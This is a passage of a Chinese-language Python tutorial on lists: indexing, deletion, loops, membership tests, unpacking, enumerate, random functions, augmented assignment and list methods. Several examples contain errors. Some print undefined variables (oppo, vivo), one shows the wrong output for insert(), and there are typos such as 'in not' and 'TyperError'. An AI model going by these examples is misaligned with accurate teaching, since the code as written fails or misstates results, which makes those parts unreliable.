&#39;Z&#39;]</code></li></ul></li><li><p><strong>用del语句从列表删除值</strong>：</p><ul><li><p><code>del</code>语句将删除列表中索引的值，列表中被删除值后面的所有值,都将向前移动一个索引，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;rat&#x27;</span>, <span class="string">&#x27;elephant&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> spam[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(spam) <span class="comment"># 输出的结果为[&#x27;cat&#x27;, &#x27;bat&#x27;, &#x27;elephant&#x27;]</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="2-使用列表"><a href="#2-使用列表" class="headerlink" title="2.使用列表"></a>2.使用列表</h2><p>在我们第一次开始编程时，可能会为了保存一组很类似的值，而创建多个不同的变量名。而列表的出现，可以让用户不再使用多个类似的变量。例如要输入你自己所有猫的名字：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">catNames = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Enter the name of cat &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(catNames) + <span class="number">1</span>) + <span class="string">&#x27; (Or enter nothing to stop.):&#x27;</span>)</span><br><span class="line">    name = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    catNames = catNames + [name]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The cat names are:&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> catNames:</span><br><span class="line">    <span class="built_in">print</span>(name)    </span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：首先我们定义了一个名为<code>catNames</code>的空列表用于存储后续输入的猫的名字，之后我们调用<code>while</code>提示用户输入第<code>N</code>只猫的名字，<code>N</code>是当前列表长度加1（如列表中有2个名字，提示输入第3只猫）。接着使用**<code>catNames = catNames + [name]</code>**将用户输入的名字<code>name</code>添加到列表<code>catNames</code>中。最后使用<code>for</code>循环遍历整个列表逐个打印猫的名字。</li></ul><h3 id="2-1-列表用于循环"><a href="#2-1-列表用于循环" class="headerlink" title="2.1.列表用于循环"></a>2.1.列表用于循环</h3><ul><li>循环可以让一段代码执行一定次数，从技术上讲循环是针对一个序列或列表中的每个值，重复的执行代码块，例如：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">CYX = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> CYX:</span><br><span class="line">    <span class="built_in">print</span>(j)</span><br></pre></td></tr></table></figure><ul><li><p><strong>解释</strong>：上面两个<code>print</code>所打印的是相同的是因为range（4）返回的是类似列表的值。</p></li><li><p><strong>一个常见的python技巧</strong>：在<code>for</code>循环中使用<code>range(len(somelist))</code>来迭代列表的每一个索引。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">supplies = [<span class="string">&#x27;pen&#x27;</span>, <span class="string">&#x27;staplers&#x27;</span>, <span class="string">&#x27;flame-throwers&#x27;</span>, <span class="string">&#x27;binders&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(supplies)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Index &#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27; in supplies is: &#x27;</span> + supplies[i])</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-2-in和not-in操作符"><a href="#2-2-in和not-in操作符" class="headerlink" title="2.2.in和not in操作符"></a>2.2.<code>in</code>和<code>not in</code>操作符</h3><ul><li><p><code>in</code>和<code>in not</code>操作符可以确定一个值是否在列表中。</p></li><li><p><code>in</code>和<code>in not</code>在表达式中用于连接两个值：1.要在列表中查找的值 2.待查找的列表（这些表达式将求值为<code>bool</code>值）。例如，下面的程序让用户输入一个宠物名字，然后检查该名字是否在宠物列表中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">myPents = [<span class="string">&#x27;Zophie&#x27;</span>, <span class="string">&#x27;Pooka&#x27;</span>, <span class="string">&#x27;Fat-tail&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Enter a pet name:&#x27;</span>)</span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> myPents:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;I do not have a pet named &#x27;</span> + name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(name + <span class="string">&#x27; is my pet.&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-3-多重赋值技巧"><a href="#2-3-多重赋值技巧" class="headerlink" title="2.3.多重赋值技巧"></a>2.3.多重赋值技巧</h3><ul><li><p>多重赋值技巧是一种快捷方式，让你在一行代码中用列表中的值为多个变量赋值。像我们以往的赋值方法就显得有些繁琐，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat = [<span class="string">&#x27;fat&#x27;</span>, <span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;loud&#x27;</span>]</span><br><span class="line">size = cat[<span class="number">0</span>]</span><br><span class="line">color = cat[<span class="number">1</span>]</span><br><span class="line">disposition = cat [<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(size, color, disposition)</span><br></pre></td></tr></table></figure></li><li><p>这样的方法需要我们一次输入变量名和对应的列表索引，很麻烦。不如像这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat = [<span class="string">&#x27;fat&#x27;</span>, <span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;loud&#x27;</span>]</span><br><span class="line">size,color,disposition = cat</span><br><span class="line"><span class="built_in">print</span>(size, color, disposition)</span><br></pre></td></tr></table></figure></li><li><p>两串代码输出的结果是一样的，而下面的代码更加简洁，但需要注意的是，变量的数目和列表的长度必须严格相等，否则python将给出<code>ValueError</code>错误。</p></li></ul><h3 id="2-4-enumerate-函数与列表一起使用"><a href="#2-4-enumerate-函数与列表一起使用" class="headerlink" title="2.4.enumerate()函数与列表一起使用"></a>2.4.<code>enumerate()</code>函数与列表一起使用</h3><ul><li><p>如果在<code>for</code>循环中不想用<code>range(len(someList))</code>技术来获取列表中各表项，还可以调用<code>enumerate()</code>函数。</p></li><li><p>在循环的每次迭代中<code>enumerate()</code>函数将返回两个值：1.表中表项的索引 2.列表中的表项本身。例如，在列表用于循环的代码中使用<code>enumerate()</code>函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">supplies = [<span class="string">&#x27;pen&#x27;</span>, <span class="string">&#x27;staplers&#x27;</span>, <span class="string">&#x27;flame-throwers&#x27;</span>, <span class="string">&#x27;binders&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(supplies):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Index &#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27; in supplies is: &#x27;</span> + item)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 以下是输出的结果</span></span><br><span class="line"><span class="comment"># Index 0 in supplies is: pen</span></span><br><span class="line"><span class="comment"># Index 1 in supplies is: staplers</span></span><br><span class="line"><span class="comment"># Index 2 in supplies is: flame-throwers</span></span><br><span class="line"><span class="comment"># Index 3 in supplies is: binders</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-5-random-choice-函数和random-shuffle-函数和列表共同使用"><a href="#2-5-random-choice-函数和random-shuffle-函数和列表共同使用" class="headerlink" title="2.5.random.choice()函数和random.shuffle()函数和列表共同使用"></a>2.5.<code>random.choice()</code>函数和<code>random.shuffle()</code>函数和列表共同使用</h3><ul><li><p><strong><code>random.choice()</code>函数</strong>：使用<code>random.choice()</code>函数，将从列表里随即返回一个表项，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">pets = [<span class="string">&#x27;Dogs&#x27;</span>, <span class="string">&#x27;Cats&#x27;</span>, <span class="string">&#x27;Moose&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(random.choice(pets))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码将输出列表pets中的任意一个表项</span></span><br></pre></td></tr></table></figure></li><li><p><strong><code>random.shuffle()</code>函数</strong>：使用<code>random.shuffle()</code>函数，将对列表中的表项重新排序，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">people = [<span class="string">&#x27;GSY&#x27;</span>, <span class="string">&#x27;CYX&#x27;</span>, <span class="string">&#x27;ZZZ&#x27;</span>, <span class="string">&#x27;XXX&#x27;</span>]</span><br><span class="line">random.shuffle(people)</span><br><span class="line"><span class="built_in">print</span>(people)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码会将列表people中的表项重新排列并输出</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="3-增强的赋值操作"><a href="#3-增强的赋值操作" class="headerlink" title="3.增强的赋值操作"></a>3.增强的赋值操作</h2><ul><li><p>在对变量赋值时，常常会用到变量本身，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spam = <span class="number">42</span></span><br><span class="line">spam = spam + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"></span><br><span class="line">abcd = <span class="number">42</span></span><br><span class="line">abcd += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(abcd)</span><br></pre></td></tr></table></figure><ul><li><p><strong>解释</strong>：</p></li><li><p>两串代码运行的结果一样，而<code>+=</code>就是增强操作符，增强操作符还有：</p><table><thead><tr><th align="center">增强操作符语句</th><th align="center">等价操作符语句</th></tr></thead><tbody><tr><td align="center">spam +&#x3D; 1</td><td align="center">spam &#x3D; spam + 1</td></tr><tr><td align="center">spam -&#x3D; 1</td><td align="center">spam &#x3D; spam - 1</td></tr><tr><td align="center">spam *&#x3D; 1</td><td align="center">spam &#x3D; spam * 1</td></tr><tr><td align="center">spam &#x2F;&#x3D; 1</td><td align="center">spam &#x3D; spam &#x2F; 1</td></tr><tr><td align="center">spam %&#x3D; 1</td><td align="center">spam &#x3D; spam % 1</td></tr></tbody></table></li><li><p><code>+=</code>操作符可以完成字符串和列表的连接，<code>*=</code>操作符可以完成字符串和列表的复制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CYX = <span class="string">&#x27;Hello,&#x27;</span></span><br><span class="line">CYX += <span class="string">&#x27;world!&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(oppo)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出的结果为：Hello,world!</span></span><br><span class="line"></span><br><span class="line">GSY = [<span class="string">&#x27;Zophie&#x27;</span>]</span><br><span class="line">GSY *= <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(vivo)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出的结果为：[&#x27;Zophie&#x27;, &#x27;Zophie&#x27;, &#x27;Zophie&#x27;]</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="4-方法"><a href="#4-方法" class="headerlink" title="4.方法"></a>4.方法</h2><ul><li>方法和函数是一回事，只是它在一个值上进行调用，例如：一个列表值存储在<code>spam</code>变量中，你可以在这个列表上调用<code>index()</code>列表方法，就像<code>spam.index(&#39;hello&#39;)</code>。</li><li>方法跟在要调用的值后面，以一个圆点分隔。每种数据类型都有它自己的一组方法，例如：列表数据类型有一些有用的方法，用来查找 、添加、删除或者修改列表中的值。</li></ul><h3 id="4-1-用index-方法在列表中查找值"><a href="#4-1-用index-方法在列表中查找值" class="headerlink" title="4.1.用index()方法在列表中查找值"></a>4.1.用<code>index()</code>方法在列表中查找值</h3><ul><li><p>列表值有一个<code>index()</code>方法，可以传入一个值，如果该值存在于列表中，就返回他的索引，如果该值不在列表中，就会报错<code>ValueError</code>，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;hi&#x27;</span>, <span class="string">&#x27;howdy&#x27;</span>, <span class="string">&#x27;heyas&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(spam.index(<span class="string">&#x27;hello&#x27;</span>)) <span class="comment"># 输出的结果为0</span></span><br><span class="line"><span class="built_in">print</span>(spam.index(<span class="string">&#x27;heyas&#x27;</span>)) <span class="comment"># 输出的结果为3</span></span><br></pre></td></tr></table></figure></li><li><p>如果列表中存在重复的值，就返回它第一次出现的引索，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oppo = [<span class="string">&#x27;Zophie&#x27;</span>, <span class="string">&#x27;Pooka&#x27;</span>, <span class="string">&#x27;Fat-tail&#x27;</span>, <span class="string">&#x27;Pooka&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(oppo.index(<span class="string">&#x27;Pooka&#x27;</span>)) <span class="comment"># 输出的结果为1</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-2-用append-方法和insert-方法在列表中添加值"><a href="#4-2-用append-方法和insert-方法在列表中添加值" class="headerlink" title="4.2.用append()方法和insert()方法在列表中添加值"></a>4.2.用<code>append()</code>方法和<code>insert()</code>方法在列表中添加值</h3><ul><li><p><code>append()</code>方法可将参数添加到列表末尾，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>]</span><br><span class="line">spam.append(<span class="string">&#x27;moose&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下是这串代码的输出结果</span></span><br><span class="line"><span class="comment"># [&#x27;cat&#x27;, &#x27;dog&#x27;, &#x27;bat&#x27;, &#x27;moose&#x27;]</span></span><br></pre></td></tr></table></figure></li><li><p><code>insert()</code>方法可以在列表任意索引出插入一个值，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>]</span><br><span class="line">spam.insert(<span class="number">1</span>, <span class="string">&#x27;Chicken&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下是这串代码的输出结果</span></span><br><span class="line"><span class="comment"># [&#x27;cat&#x27;, &#x27;Chicken&#x27;, &#x27;dog&#x27;, &#x27;bat&#x27;, &#x27;moose&#x27;]</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>insert()</code>方法的第一个参数是新值的索引，第二个参数是要加入的新值。</li></ul></li><li><p><strong>注意</strong>：</p><ol><li><code>append()</code>方法与<code>insert()</code>方法都不会将<code>spam</code>的新值作为其返回值 （事实上他们两的返回值都为<code>None</code>），所以直接<code>print(vivo.append(&#39;moose&#39;))</code>之类的表述，输出的值会为<code>None</code>。</li><li>方法属于单个的数据类型，只能在列表上调用，而不能在字符串或者整型等其它值上调用。</li></ol></li></ul><h3 id="4-3-用remove-方法从列表中删除值"><a href="#4-3-用remove-方法从列表中删除值" class="headerlink" title="4.3.用remove()方法从列表中删除值"></a>4.3.用<code>remove()</code>方法从列表中删除值</h3><ul><li><p>给<code>remove()</code>方法传入一个值，它将从调用该方法的列表中删除这个值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;rat&#x27;</span>, <span class="string">&#x27;elephant&#x27;</span>]</span><br><span class="line">spam.remove(<span class="string">&#x27;bat&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码输出的结果如下</span></span><br><span class="line"><span class="comment"># [&#x27;cat&#x27;, &#x27;rat&#x27;, &#x27;elephant&#x27;]</span></span><br></pre></td></tr></table></figure><ul><li><strong>注意</strong>：如果试图删除列表中不存在的值时，就会发生<code>ValueError</code>错误。</li></ul></li><li><p>如果该列表中存在出现多次的值，只有第一次会被删除。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spam =[<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;rat&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;hat&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line">spam.remove(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码输出的结果如下</span></span><br><span class="line"><span class="comment"># [&#x27;bat&#x27;, &#x27;rat&#x27;, &#x27;cat&#x27;, &#x27;hat&#x27;, &#x27;cat&#x27;]</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-4-用sort-方法将列表中的值排序"><a href="#4-4-用sort-方法将列表中的值排序" class="headerlink" title="4.4.用sort()方法将列表中的值排序"></a>4.4.用<code>sort()</code>方法将列表中的值排序</h3><ul><li><p>包含数值的列表或字符串列表能用<code>sort()</code>方法排序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MosHSasA = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">3.14</span>, <span class="number">1</span>, -<span class="number">7</span>]</span><br><span class="line">MosHSasA.sort()</span><br><span class="line"><span class="built_in">print</span>(MosHSasA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码输出的结果如下</span></span><br><span class="line"><span class="comment"># [-7, 1, 2, 3.14, 5]</span></span><br></pre></td></tr></table></figure></li><li><p>也可以指定<code>reverse</code>关键字参数为<code>True</code>，让<code>sort()</code>方法按照逆序排序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MosHSasA = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">3.14</span>, <span class="number">1</span>, -<span class="number">7</span>]</span><br><span class="line">MosHSasA.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(MosHSasA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码输出的结果如下</span></span><br><span class="line"><span class="comment"># [5, 3.14, 2, 1, -7]</span></span><br></pre></td></tr></table></figure></li><li><p><strong>关于<code>sort()</code>方法应该注意三件事</strong>：</p><ol><li><p><code>sort()</code>方法就地的对列表排序不要写出<code>spam = spam.sort()</code>这样的代码。</p></li><li><p>不能对既有数字又有字符串值的列表排序，这样会发生<code>TypeError</code>错误。</p></li><li><p><code>sort()</code>方法对字符串排序时，使用<code>ASCII码</code>排序，而不是实际的字典排序，这意味着大写字母在小写字母之前，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;ants&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;badgers&#x27;</span>, <span class="string">&#x27;Carol&#x27;</span>, <span class="string">&#x27;cats&#x27;</span>]</span><br><span class="line">spam.sort()</span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码输出的结果如下</span></span><br><span class="line"><span class="comment"># [&#x27;Alice&#x27;, &#x27;Bob&#x27;, &#x27;Carol&#x27;, &#x27;ants&#x27;, &#x27;badgers&#x27;, &#x27;cats&#x27;]</span></span><br></pre></td></tr></table></figure><p>如果要按照普通的字典顺序来排序，就在调用<code>sort()</code>方法时，将关键字参数<code>key</code>设置成<code>str.lower</code>，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line">spam.sort(key=<span class="built_in">str</span>.lower)</span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码输出的结果如下</span></span><br><span class="line"><span class="comment"># [&#x27;a&#x27;, &#x27;A&#x27;, &#x27;z&#x27;, &#x27;Z&#x27;]</span></span><br></pre></td></tr></table></figure></li></ol></li></ul><h3 id="4-5-使用reverse-方法反转列表中的值"><a href="#4-5-使用reverse-方法反转列表中的值" class="headerlink" title="4.5.使用reverse()方法反转列表中的值"></a>4.5.使用<code>reverse()</code>方法反转列表中的值</h3><ul><li><p>如果想要快速反转列表中的项目顺序，可以调用<code>reverse()</code>方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spam = [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;moose&#x27;</span>]</span><br><span class="line">spam.reverse()</span><br><span class="line"><span class="built_in">print</span>(spam)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这串代码输出的结果如下</span></span><br><span class="line"><span class="comment"># [&#x27;moose&#x27;, &#x27;dog&#x27;, &#x27;cat&#x27;]</span></span><br></pre></td></tr></table></figure></li><li><p><strong>注意</strong>：和<code>sort()</code>方法一样<code>reverse()</code>方法也不返回列表，这就是为什么要写成<code>spam.reverse()</code>而不是<code>spam = spam.reserve()</code>。</p></li></ul><h2 id="5-序列数据类型"><a href="#5-序列数据类型" class="headerlink" title="5.序列数据类型"></a>5.序列数据类型</h2><ul><li><p>列表并不是唯一表示序列值的数据类型，如果将字符串考虑为单个文本字符的列表，那么字符串和列表实际上是相似的。python序列数据类型包括：列表、字符串、由<code>range()</code>返回的范围对象、以及元组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;Zophie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(name[-<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Zo&#x27;</span> <span class="keyword">in</span> name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;z&#x27;</span> <span class="keyword">in</span> name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;* * * &#x27;</span> + i + <span class="string">&#x27; * * *&#x27;</span>)</span><br></pre></td></tr></table></figure><p>以上代码的输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Z</span><br><span class="line">i</span><br><span class="line">Zoph</span><br><span class="line">True</span><br><span class="line">False</span><br><span class="line">False</span><br><span class="line">* * * Z * * *</span><br><span class="line">* * * o * * *</span><br><span class="line">* * * p * * *</span><br><span class="line">* * * h * * *</span><br><span class="line">* * * i * * *</span><br><span class="line">* * * e * * *</span><br></pre></td></tr></table></figure></li><li><p><strong>解释</strong>：这表示对于列表的许多操作，也可以作用于字符串和序列数据类型的其他值。</p></li></ul><h3 id="5-1-可变和不可变数据类型"><a href="#5-1-可变和不可变数据类型" class="headerlink" title="5.1.可变和不可变数据类型"></a>5.1.可变和不可变数据类型</h3><ul><li><p>列表和字符串在一个重要方面是不同的：列表是可变的，它可以添加删除或改变；字符串是不可变的，它不能被更改。尝试对一个字符串重新赋值将导致<code>TyperError</code>错误，例如这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;Zophie a cat&#x27;</span></span><br><span class="line">name[<span class="number">7</span>] = <span class="string">&#x27;the&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>改变一个字符串的正确方式是使用：切片和连接来构造一个新的字符串，从旧的字符串里复制一部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;Zophie a cat&#x27;</span></span><br><span class="line">newName = name[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&#x27;the&#x27;</span> + name[<span class="number">8</span>:<span class="number">12</span>]</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(newName) <span class="comment"># 输出的结果是Zophie the cat</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>name[0:7]</code>将字符串第0个字符到第7个（但不包含第7个）字符保留，<code>name[8:12]</code>类似，之后得到的替换字符串，但注意我们原来的字符串并没有改变。</li></ul></li><li><p>尽管列表值是可变的，但下面代码中的第二行并没有修改<code>eggs</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 